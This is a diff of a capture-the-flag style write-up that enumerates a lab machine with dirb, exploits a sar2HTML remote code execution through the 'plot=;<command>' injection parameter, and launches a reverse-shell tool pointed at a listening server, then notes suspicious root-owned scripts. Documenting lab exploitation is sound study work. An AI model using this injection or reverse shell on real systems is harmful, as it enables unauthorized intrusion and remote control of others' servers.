@@ -43,22 +43,24 @@ $> dirb http://IPADDRESS/ /path/to/wordlist
 The output of **dirb** tool shows 3 valid paths, `index.html` which is the default apache page, `phpinfo.php` shows php info, and finally `robots.txt` that has `sar2HTML` text.
 I put that text as path in URL and I got the following page
 
-<p align="center"><img src="screenShots/sar2HTML.png" alt="sar2HTML page"/></p><br>
+<p align="center"><img src="screenShots/sar2HTML.png" alt="sar2HTML page"/></p>
 
 ### Exploiting
 
 After reading the content I decided to look up sar2Html in google, and I found that it is a service that has a Remote Code Execution vulnerability, I exploited it as described in <a href="https://www.exploit-db.com/exploits/47204">exploit-db</a>, `IPADDRESS/sar2HTML/index.php?plot=;<command>` this will execute the command and show the output of it in select host droplist at the left of the page.
 
-<p align="center"><img src="screenShots/RunTheExploit.png" alt="Exploited sar2HTML"/></p><br>
+<p align="center"><img src="screenShots/RunTheExploit.png" alt="Exploited sar2HTML"/></p>
 
 After executing the command I immediately thought of a reverse shell, I found this <a href="https://github.com/AssassinUKG/sar2HTML">Reverse Shell for sar2HTML</a> and executed it as follow
 
 ```bash
 $> ./sar2HTML -ip MACHINEIPADDRESS -rip LISTENING_SERVER_FOR_REVERSE_SHELL -pe DIRECTORY
 ```
-running `rs session` on the webShell will create a server listening on IP:PORT provided in `-rip` flag with a Reverse Shell.
-after getting the reverse shell I started checking the current directory, which is `/sar2HTML`, then back one step to parent directory which is `/var/www/html`, I found in this directory 2 suspicious files, `finally.sh` with root owner and `write.sh` with current user which is `www-data`.
-after printing their content I found that `finally.sh` execute `write.sh` file, where `write.sh` file create `/tmp/gateway` file using `touch` command. Thats all I could get for now 
+running `rs session` on the webShell will create a server (listening on `IP:PORT` provided in `-rip` flag) with a Reverse Shell.<br>
+After getting the reverse shell I started checking the current directory, which is `/sar2HTML`, then back one step to parent directory which is `/var/www/html`.<br>
+I found in this directory 2 suspicious files, `finally.sh` with root as owner and `write.sh` with current user as owner which is `www-data`.<br>
+After printing their content I found that `finally.sh` execute `write.sh` file, where `write.sh` file create `/tmp/gateway` file using `touch` command.<br>
+That is all I could get for now.
 <p align="center"><img src="screenShots/ReverseShell.png" alt="Reverse Shell"/></p><br>
 
 ### LinPEAS
